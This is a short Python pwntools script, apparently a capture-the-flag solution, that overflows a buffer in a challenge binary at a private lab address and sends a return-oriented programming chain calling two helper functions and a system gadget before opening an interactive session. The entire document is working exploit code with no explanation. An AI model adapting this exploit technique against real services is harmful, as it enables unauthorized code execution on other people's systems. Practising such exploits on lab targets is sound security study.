from pwn import *

offset = 72
pop_rdi = 0x0000000000400863 # for param 1
pop_rsi_r15 = 0x0000000000400861 # for param 2
callme = 0x004006e6
callmeagain = 0x00400727
echo_to_system = 0x00400769

p = remote('192.168.100.15', 5000)
elf = ELF('./chall')

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(31337)
payload += p64(pop_rsi_r15)
payload += p64(0x400884)
payload += p64(0)
payload += p64(callme)

payload += p64(pop_rdi)
payload += p64(2)
payload += p64(pop_rsi_r15)
payload += p64(0x40088b)
payload += p64(0)
payload += p64(callmeagain)
payload += p64(echo_to_system)

p.sendlineafter(b',  ', payload)
p.interactive()